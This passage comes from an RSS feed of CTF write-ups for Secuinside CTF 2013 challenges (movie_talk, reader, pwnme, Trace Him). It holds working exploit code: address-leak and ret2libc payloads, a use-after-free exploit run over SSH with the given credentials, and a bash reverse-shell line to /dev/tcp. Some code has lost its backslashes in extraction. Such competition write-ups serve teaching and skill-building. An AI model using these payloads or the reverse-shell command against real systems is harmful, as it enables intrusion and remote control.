</pre>

<p>Woops, 1st movie_lsit is overwriten, now we can list movies and watch how our<br />
data goes to 0x61616161:</p>

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax

--------------------------------------------------------------------------[regs]
 EAX: 0x61616161  EBX: 0xB7FC3000  ECX: 0xB7FDA000  EDX: 0x0804C008  o d I t s z a p c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048C21
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048c21:    call   eax
 0x8048c23:    add    DWORD PTR [ebp-0xc],0x1
</pre>

<p>What is also important to notice here, is that movie list is pushed on stack, that means that stack layout is pointing to our controled buffer, so whatever we put into this movie_name, can be used as  argument for our code:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/4wx $esp
0xbffff150:    0x0804c008    0x0000000c    0xb7fc3ac0    0xb7e13900
               ^^^^^^^^^^
                   |
                   +---- our controled input

</pre>

<p>Address leak bonus, which was our 1st idea to get system address right away, was to leak puts address and do subtraction, unfortunately due to writing to pipe output would only come when pipe buffer is filled or process is terminated, so our idea didn’t work, but for fun here is our code to leak puts address:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p puts-system
$1 = 0x26cf0
</pre>

<pre class="brush: plain; title: ; notranslate" title="">import time
import struct
import os
import subprocess

proc = subprocess.Popen("./movie_talk",
                        #shell=True,
                        stdin = subprocess.PIPE,
                        stdout = subprocess.PIP,
                        stderr = subprocess.PIPE);

payload = "1n" + "a" * 16 + "n0n0n"

#leak address of puts on ubuntu 13.04
payload += "1n";
payload += struct.pack("&lt;L", 0x80487aa);
payload += struct.pack("&lt;L", 0x804b030);
payload += struct.pack("&lt;L", 0x804b030);
payload += "n0n0n"
payload += "3n";
proc.stdin.write(payload);
time.sleep(3);
os.system("killall -3 movie_talk");
time.sleep(5);
proc.stdin.write("4n");
proc.wait();
buff = proc.stdout.read();
index = buff.find("movie id: 134524976");
index+=7;
index+=len("movie id: 134524976");
data = struct.unpack("&lt;L", buff[index:index+4]);
for x in data:
    print("puts address   : 0x%.08X" % x);
    print("system address : 0x%.08X" % (x-0x26cf0));
</pre>

<p>and simple exploit to crash process (enable core dump):</p>

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python
import  subprocess
import  time
import  os

proc = subprocess.Popen("./movie_talk",
                       shell=False,
                       stdin=subprocess.PIPE);

proc.stdin.write("1n" + "a"*16+"n"+"0n0n");
proc.stdin.write("1n" + "a"*16+"n"+"0n0n"); &lt;-- payload goes here
time.sleep(3);
os.system("killall -3 movie_talk");
proc.stdin.write("3n");
proc.stdin.write("4n");
proc.wait();

</pre>

  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013] Reader Writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-29T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</guid>
  <description><![CDATA[
     <p><em>Description:</em></p>

<blockquote>
  <p>http://war.secuinside.com/files/reader</p>

  <p>ip : 59.9.131.155<br />
port : 8282 (SSH)<br />
account : guest / guest</p>

  <p>We have obtained a program designed for giving orders to criminals.</p>

  <p>Our investigators haven’t yet analyzed the file format this program reads.</p>

  <p>Please help us analyze the file format this program uses, find a vulnerability, and take a shell.</p>
</blockquote>

<p>From the description we can know this challenge requires an input file with correct format. Since it is simple to determine that format, I won’t talk deeper, you can find the details in sub_0804891A.<br />
So I will show the vulnerability in this “Reader”.</p>

<p>Below is the main routine of this challenge:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80490B8(signed int a1, int a2)
{
  int v2; // ecx@7
  int result; // eax@7
  int file; // [sp+20h] [bp-90h]@4
  char buffer[140]; // [sp+24h] [bp-8Ch]@1

  *(_DWORD *)&amp;buffer[136] = *MK_FP(__GS__, 20);
  if ( a1 &lt;= 1 )
  {
    printf("Usage: %s &lt;FILENAME&gt;n", *(_DWORD *)a2);
    exit(1);
  }
  sub_8048825(*(const char **)(a2 + 4));
  file = open(*(const char **)(a2 + 4), 0);
  if ( file &lt; 0 )
  {
    perror(&amp;byte_8049322);
    exit(1);
  }
  pre_path(file, (_DWORD *)buffer);
  vuln_path((_DWORD *)buffer);
  free_path((_DWORD *)buffer);
  close(file);
  result = 0;
  if ( *MK_FP(__GS__, 20) != *(_DWORD *)&amp;buffer[136] )
    __stack_chk_fail(v2, *MK_FP(__GS__, 20) ^ *(_DWORD *)&amp;buffer[136]);
  return result;
}
</pre>

<p>As you can see, variable buffer is used in multiple locations. After some minutes review I saw an interesting point in sub_08048C7A:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl vuln_path_(_DWORD *BUFF)
{
  size_t ulen; // eax@4
  int v2; // edx@4
  int v3; // ecx@4
  int result; // eax@4
  unsigned int i; // [sp+28h] [bp-20h]@1
  int v6; // [sp+3Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  for ( i = 0; BUFF[2] &gt; i; ++i )
  {
    putchar(*(_BYTE *)(BUFF[7] + i));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  ulen = strlen((const char *)BUFF + 83);       // re-cal length (1)
  strncpy(BUFF[6], gPTR, ulen);                 // overflow occurs
  puts("n");
  result = *MK_FP(__GS__, 20) ^ v6;
  if ( *MK_FP(__GS__, 20) != v6 )
    __stack_chk_fail(v3, v2);
  return result;
}
</pre>

<p>The <em>strncpy()</em> function copies <strong>ulen</strong> bytes from <strong>gPTR</strong> to <strong>BUFF[6]</strong> without any limit check. So I back to main routine to see where <strong>BUFF[6]</strong> is initialized, and it is located in sub_08048D41:</p>

<pre class="brush: cpp; title: ; notranslate" title="">unsigned int index; // [sp+18h] [bp-20h]@1
  int s[7]; // [sp+1Ch] [bp-1Ch]@1

  bzero(s, 0x14u);
  putchar(10);
  for ( index = 0; *BUFF &gt; index; ++index )
  {
    putchar(*(_BYTE *)(BUFF[5] + index));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  printf("nn ");
  for ( index = 0; BUFF[1] + 4 &gt; index; ++index )
  {
    putchar(*((_BYTE *)BUFF + 16));
    fflush(stdout);
    usleep(BUFF[3]);
  }
 .....
 .....
  BUFF[6] = &index;
 .....
 .....
</pre>

<p>So <strong>BUFF[6]</strong> is set to address of local variable of this function, we can clearly see this function is not protected by stack cookie. So it is just a simple buffer overflow issue. We can craft a valid file format and see where it gets the input to calculate <strong>ulen</strong> in (1). Back to sub_0804891A we can see:</p>

<pre class="brush: cpp; title: ; notranslate" title="">*BUFF = *(_DWORD *)&buf;
  read(fd, &amp;buf, 4u);
  BUFF[1] = *(_DWORD *)&buf;                    // read 4 bytes from file
  read(fd, &amp;buf, 4u);
  BUFF[2] = *(_DWORD *)&buf;
  read(fd, &amp;buf, 4u);
  BUFF[3] = *(_DWORD *)&buf;
  read(fd, &amp;buf, 1u);
  *((_BYTE *)BUFF + 16) = buf;
  if ( *BUFF &lt;= 4u || *BUFF &gt; 0x32u || BUFF[1] &gt; 0x64u || BUFF[2] &gt; 0x320u || !*((_BYTE *)BUFF + 16) )// 0x4-0x32 0x64 0x32
    ((void (__cdecl *)(_DWORD))ERR)("Initialization error");
  Copy(&amp;buf, (char *)BUFF + 32);
  BUFF[5] = malloc(*BUFF);
  if ( !BUFF[5] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[6] = malloc(BUFF[1]);                    // use 4 bytes read above to malloc -&gt; BUFF[6] will has this length
  gPTR = (void *)BUFF[6]; -&gt; Set gPTR to BUFF[6]
  if ( !BUFF[6] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[7] = malloc(BUFF[2]);
  if ( !BUFF[7] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  bzero((void *)BUFF[5], *BUFF);
  bzero((void *)BUFF[6], BUFF[1]);
  bzero((void *)BUFF[7], BUFF[2]);
  read(fd, (void *)BUFF[5], *BUFF);
  read(fd, (void *)BUFF[6], BUFF[1]);
  read(fd, (void *)BUFF[7], BUFF[2]);
</pre>

<p>Since it checks <strong>BUFF[1]</strong> with 0×64, I blindly set it to 0×63 to maximize the len of <strong>gPTR</strong> string and got a nice crash, so no need to do further investigation. Below is python code to generate valid <em>“test.sec”</em> file and trigger the crash:</p>

<pre class="brush: python; title: ; notranslate" title="">data = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
       + "x08x00x00x00"
       + "x63x00x00x00" # will become BUFF[1] and length of BUFF[6]
       + "x32x00x00x00"
       + "x00x00x00x00"
       + "X"*200
file = open("test.sec","w")
file.write(data)
file.close()
</pre>

<p>Run reader with <em>test.sec</em> and we got a crash looks like:</p>

<pre class="brush: plain; title: ; notranslate" title="">- THE END -
document identifier code: 14821847921482184792148218479214821847921482184792

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2
EBX: 0xb7fcfff4 --&gt; 0x1a0d7c
ECX: 0xffffffff
EDX: 0xb7fd18b8 --&gt; 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x58585858 ('XXXX')
ESP: 0xbffff640 ("XXXXXXXXXX")
EIP: 0x58585858 ('XXXX')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x58585858
[------------------------------------stack-------------------------------------]
0000| 0xbffff640 ("XXXXXXXXXX")
0004| 0xbffff644 ("XXXXXX")
0008| 0xbffff648 --&gt; 0x5858 ('XX')
0012| 0xbffff64c --&gt; 0xb7fff918 --&gt; 0x0
0016| 0xbffff650 --&gt; 0x0
0020| 0xbffff654 --&gt; 0x0
0024| 0xbffff658 --&gt; 0x0
0028| 0xbffff65c --&gt; 0xbffff794 --&gt; 0xbffff8b6 ("/home/suto/reader")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x58585858 in ?? ()
</pre>

<p>As this is a local exploit, <em>“ulimit -s unlimited”</em> trick will help to de-randomize libc and a simple system(“sh”) will work. Payload:</p>

<pre class="brush: plain; title: ; notranslate" title="">system = 0x4006b280
sh = 0x8048366
payload = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
         + "x08x00x00x00"
         + "x08x00x00x00"
         + "x32x00x00x00"
         + "x00x00x00x00"
         + "A"*37 # padding
         + struct.pack("&lt;L", system) + struct.pack("&lt;L", -1) + struct.pack("&lt;L", sh)
fd = open("test.sec","w")
fd.write(payload)
fd.close()
</pre>

  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013] pwnme writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</guid>
  <description><![CDATA[
     <p>Challenge summary:</p>

<p>Binary : http://war.secuinside.com/files/pwnme<br />
Source : http://war.secuinside.com/files/pwnme.c<br />
===================================<br />
OS : Ubuntu 13.04 with PIE+ASLR+NX<br />
md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4</p>

<p>IP : 54.214.248.68<br />
PORT : 8181,8282,8383</p>

<p>This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at <em>pwnme.c:67</em>, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at <em>pwnme.c:72</em>, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).</p>

<p>Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at <em>pwnme.c:71</em>, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:</p>

<pre class="brush: plain; title: ; notranslate" title="">Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb774b000 --&gt; 0x1aed9c
ECX: 0x0
EDX: 0xb774b000 --&gt; 0x1aed9c
ESI: 0x0
EDI: 0x0
EBP: 0x41397441 ('At9A')
ESP: 0xbfac6ce0 --&gt; 0x1
EIP: 0x75417375 ('usAu')
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x75417375
[------------------------------------stack-------------------------------------]
0000| 0xbfac6ce0 --&gt; 0x1
0004| 0xbfac6ce4 --&gt; 0xbfac6d74 --&gt; 0xbfac78db ("./pwnme")
0008| 0xbfac6ce8 --&gt; 0xbfac6d7c --&gt; 0xbfac78e3 ("TERM=xterm")
0012| 0xbfac6cec --&gt; 0xb777a000 --&gt; 0x20f38
0016| 0xbfac6cf0 --&gt; 0x20 (' ')
0020| 0xbfac6cf4 --&gt; 0x0
0024| 0xbfac6cf8 --&gt; 0xb77566f0 --&gt; 0xb759c000 --&gt; 0x464c457f
0028| 0xbfac6cfc --&gt; 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x75417375 in ?? ()
gdb-peda$ patts
Registers contain pattern buffer:
EIP+0 found at offset: 1036
EBP+0 found at offset: 1032
No register points to pattern buffer
Pattern buffer found at:
0xb7753000 : offset 1016 - size   24 (mapped)
0xb7753023 : offset   27 - size  989 (mapped)
0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
References to pattern buffer found at:
0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
gdb-peda$
</pre>

<p>Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is “stdout” buffer used in <em>printf()</em> at <em>pwnme.c:70</em>.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ info symbol 0xb7753000
No symbol matches 0xb7753000.
gdb-peda$ info symbol 0xb774ba24
_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
</pre>

<p>We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ vmmap libc
Start      End        Perm    Name
0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
gdb-peda$ distance 0xb759c000 0xb7753000
From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
</pre>

<p>Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling <em>system()</em> with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).</p>

<p>Sample payload will look like:</p>

<pre class="brush: plain; title: ; notranslate" title="">base = 0xb7500000 + bruteforce_value
target = base + 1798144 + 0x304 # make enough space for fake stack
cmd_ptr = target + some_offset # calculate it yourself
cmd = "bash -c 'exec &gt;/dev/tcp/127.127.127.127/4444 0&lt;&amp;1';"
payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
payload += [target] # will become EBP
payload += [leave_ret] # stack pivoting
</pre>

<p>Run it hundred of times and wait for a shell coming to your box.</p>

  ]]></description>
</item>

	<item>
  <title>[Secuinside CTF 2013]Trace Him Writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2013-05-27T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html</guid>
  <description><![CDATA[
     <p><em><span style="text-decoration: underline">Description:</span></em></p>

<p><em><span style="text-decoration: underline"> </span></em></p>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">IP : 59.9.131.155</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">port : 18562 (SSH)</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">account :  control  / control porsche</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">binary : http://war.secuinside.com/files/firmware</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">data : http://war.secuinside.com/files/car.bin</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">hint :</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">root@ubuntu:~# uname -a</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">The evil group is running away by a car who stole personal information of BHBank.</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">The car has feature that you could do like &#8220;remote desktop.&#8221;</span></em>
</div>

<div style="width: 1px;height: 1px;overflow: hidden">
  <em><span style="text-decoration: underline">You can find a vulnerability and stop the car. Get the evil!</span></em>
</div>

<blockquote>
  <p>IP : 59.9.131.155</p>

  <p>port : 18562 (SSH)</p>

  <p>account :  control  / control porsche</p>

  <p>binary : http://war.secuinside.com/files/firmware</p>

  <p>data : http://war.secuinside.com/files/car.bin</p>

  <p>(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)</p>

  <p>hint :</p>

  <p>root@ubuntu:~# uname -a</p>

  <p>Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux</p>

  <p>The evil group is running away by a car who stole personal information of BHBank.</p>

  <p>The car has feature that you could do like “remote desktop.”</p>

  <p>You can find a vulnerability and stop the car. Get the evil!</p>
</blockquote>

<p>When login to with ssh credential provided, we’ll get a car’s control interface look like:<br />
<img class="alignnone" src="http://img441.imageshack.us/img441/9483/74587496.png" alt="" width="457" height="800" /><br />
Using arrow keys to mov “O” around. Now look at the binary we can know how to control this car.<br />
Go to sub_804B01C function we can see a simple switch/case looks like:</p>

<pre class="brush: cpp; title: ; notranslate" title="">switch ( recvChr )
    {
    case '1':
     ..........
    case '2':
     .........
    case 'A':
     .......
    case 'B':
     .......
    case 'D':
     .......
    case 'C':
     .......
    case ' ':
     .......
    default:
}
</pre>

<p>Using these keys we can playing with feature that interface provided. When navigate the “O” to the “@” position,press [SPACE] , it will provide 3 options look like:<br />
<img class="alignnone" src="http://img7.imageshack.us/img7/1090/54551606.png" alt="" width="384" height="800" /><br />
Let go to the binary and find out how it implemented. Take a look at function sub_0804902B:</p>

<pre class="brush: cpp; title: ; notranslate" title="">obj_1 = (obj_1 *)malloc(52u);
  memset(obj_1, 0, 0x34u);
  obj_1-&gt;indi = '+';
  obj_1-&gt;flag_1 = 12;
  obj_1-&gt;flag_2 = 5;
  obj_1-&gt;flag_3 = 8;
  obj_1-&gt;handle = (int)f_handle;
  obj_1-&gt;window = (int)&amp;obj_1-&gt;case1;
  obj_1-&gt;case1 = (int)case1_1;
  obj_1-&gt;case2 = (int)case1_2;
  obj_1-&gt;case3 = (int)case1_3;
  obj_1-&gt;str1 = (int)&nLockDoor;
  obj_1-&gt;str2 = (int)&unLockDoor;
  obj_1-&gt;str3 = (int)&Detach;
  obj_1-&gt;str4 = (int)&off_804D094;
</pre>

<p>Here I have created a struct for that obj, we can clearly see it creates 5 obj which is corresponding to  5 positions with “@”. When navigating the “O” to a position with “@” and press [SPACE] it will be proceeded in switch/case we have seen above:</p>

<pre class="brush: cpp; title: ; notranslate" title="">case ' ':
        if ( curPos == '@' )
        {
          mvwprintw(v15, 8, 5, "%x %x %x %x", v4, v5);
          wrefresh(v15);
          if ( var_window )
            v4 = var_window-&gt;_cury;&lt;/code&gt;
          else
            v4 = -1;
          if ( var_window )
            v5 = var_window-&gt;_curx;
          else
            v5 = -1;
          do_f_((int)var_window, v15, v9, v4, v5);
          v12 = 1;
        }
        break;
</pre>

<p>Take a look at function do_f_:</p>

<pre class="brush: cpp; title: ; notranslate" title="">if ( a3 == '@' )
  {
    for ( i = 0; i &lt;= 5; ++i )
    {
      v8 = *(&amp;gObject_array + i);
      if ( cury - 1 == (char)v8-&gt;flag_1 &amp;&amp; (char)v8-&gt;flag_2 == curx )
      {
        indi = (char)v8-&gt;indi;
        break;
      }
    }
</pre>

<p>First the code will loop through 5 objects and check if the object-&gt;flag1 and object-&gt;flag2 are correct, if matched it will set current object to that address. Something weird here can be abused: if there is memory with correct flag1 and flag2, the code will blindly accept it as an valid object.<br />
Next part of code is calling the handle function in object with specific parameters:</p>

<pre class="brush: cpp; title: ; notranslate" title="">switch ( indi )
    {
      case '+':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
                   (*(&amp;gObject_array + i))-&gt;window,
                   *(&amp;gObject_array + i),
                   a1,
                   a2);
        break;
      case ',':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
                   (*(&amp;gObject_array + i))-&gt;window,
                   *(&amp;gObject_array + i),
                   a1,
                   a2);
        break;
      case '-':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
                   (*(&amp;gObject_array + i))-&gt;window,
                   *(&amp;gObject_array + i),
                   a1,
                   a2);
        break;
      case '.':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))-&gt;handle)(
                   (*(&amp;gObject_array + i))-&gt;window,
                   *(&amp;gObject_array + i),
                   a1,
                   a2);
        break;
      case '/':
        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;gObject_array + i))[2].flag_3)(
                   (*(&amp;gObject_array + i))[1].indi,
                   *(&amp;gObject_array + i),
                   a1,
                   a2);
        break;
      default:
        return result;
    }
</pre>

<p>So now the time to go to handle function and see what happen there:</p>

<pre class="brush: cpp; title: ; notranslate" title="">v8 = *(void (__cdecl **)(_DWORD, _DWORD))a2[13];
  v9 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 4);
  v10 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 8);
_ch = (char)wgetch(a4);
  switch ( _ch )
  {
    case '2':
      v9(a3, a4);
      break;
    case '3':
      v10(a3, a4);
      break;
    case '1':
      v8(a3, a4);
      break;
    default:
      mvwprintw(a4, 12, 1, "Wrong");
      wrefresh(a4);
      break;
  }
</pre>

<p>v8,v9,v10 is function pointer case1,case2,case3 to handle user’s choice. Take a quick look at all functions that handle user’s choice, I found the interesting one is all “Detach” functions share the same code that frees the object but not clear the pointer in object_array.<br />
And another bug introduced in binary was out of bounds read/write. I will let u find that one, it makes me confuse a little bit about attack vector and finally I do something like:</p>

<ol>
  <li>Free an object to get a “dangling pointer” in object_array (make sure it is not the last one in object_array).  </li>
  <li>Reallocate that pointer with string we can control the content (so we can fool program with fake indi( “+”,”.”,”,”,”/” ) and fake flag1,flag2.  </li>
  <li>Trigger the handle function, when it loops through the object_array it will think our fake object is correct object, then calls the handle function of that object via offset  </li>
  <li>41414141 ( Kab00m)</li>
</ol>

<p>To visualize the exploit steps, here is the object_array during exploitation:<br />
0x804d380:<br />
[Door Object Pointer][Rapair Object Pointer][Front Missle Object Pointer][Rare Object Pointer][Rear Object Pointer]</p>

<p>*First we Detach Front Missle Object Pointer so it will become:<br />
0x804d380:<br />
[Door Object Pointer][Rapair Object Pointer][Pointer to Freed memory size 0x34][Rare Missle Object Pointer][Rear Object Pointer]<br />
<img class="alignnone" src="http://img191.imageshack.us/img191/3107/19012399.png" alt="" width="400" height="800" /><br />
*Reallocate that memory with Repair Object Comment so it will look like:<br />
[Door Object Pointer][Rapair Object Pointer][Pointer to Content ( AAAAAAAAAAA) ][Rare Missle Object Pointer][Rear Object Pointer]<br />
<img class="alignnone" src="http://img19.imageshack.us/img19/5749/89539837.png" alt="" width="380" height="800" /><br />
Of course in exploitation we will replace “AAAA…” with string looks like a correct Rare Object.</p>

<p>*Call Rare Missle Object handle function</p>

<p>Finally, exploit code :</p>

<pre class="brush: python; title: ; notranslate" title="">from pexpect import spawn
import time

child = spawn('ssh -p 18562 control@59.9.131.155')
child.expect('password')

child.sendline('control porsche')
#child = spawn("./por")

KEY_UP = 'x1b[A'
KEY_DOWN = 'x1b[B'
KEY_RIGHT = 'x1b[C'
KEY_LEFT = 'x1b[D'

child.expect('Console')

child.send(KEY_RIGHT * 9)
child.send(KEY_DOWN * 2)
child.send(" 3")

child.send(KEY_DOWN)
child.send(KEY_LEFT * 6)
child.send(" 1")
child.sendline("x2dx41x41x41" +"x06x01x01x01" + "x06x01x01x01" + 'AAAAx6bx85x04x08'+"C"*28+"x40x89x04x08")

child.send(" ")

child.sendline("echo 'cat /home/admin/StopTheCar'|./PrivilegeEscalation")

child.interact()
</pre>

<p>Actually, after getting the shell, I got a mini heart attack from organizer since the ReadMe file tells this is 2-steps challenge, it needs another local exploit. My team mate @w00d helped me to retrieve the PrivilegeEscalation binary, and it only does one thing:</p>

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_804844C()
{
  setreuid(0x3E8u, 0x3E8u);
  return system("/bin/bash");
}
</pre>

<p>It really a nice challenge to work with, thanks organizer for awesome binaries, thank all you guys from CLGT CTF team <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /><br />
See u in next CTF.</p>

  ]]></description>
</item>

	<item>
  <title>Snatching The H@t</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/11/25/snatching-the-hat.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-11-25T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/11/25/snatching-the-hat.html</guid>
  <description><![CDATA[
     <p><a href="http://ctf.vnsecurity.net:8080/"><img class="aligncenter size-full wp-image-1527" title="Snacthing the H@t" src="/wp/storage/uploads/2012/11/sth.jpg" alt="Snacthing the H@t" width="600" height="133" /></a></p>

